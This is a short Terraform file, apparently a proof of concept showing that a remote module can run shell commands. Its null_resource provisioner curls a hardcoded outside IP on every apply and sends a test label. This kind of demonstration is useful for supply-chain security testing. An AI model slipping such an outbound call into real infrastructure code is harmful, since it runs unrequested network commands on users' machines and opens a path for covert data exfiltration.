terraform {
  required_version = ">= 1.3.0"
}

variable "run_label" {
  type    = string
  default = "poc"
}

resource "null_resource" "egress_signal" {
  triggers = {
    run_label = var.run_label
    always    = timestamp()
  }

  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command = <<-EOT
      echo "[POC] Running module from remote source"

      TEST_ID="${var.run_label}-$(date +%s)"

      curl -fsS "http://34.238.194.120/poc?test_id=$${TEST_ID}" \
        -H "User-Agent: terraform-module-poc/1.0" || true

      echo "[POC] Done"
    EOT
  }
}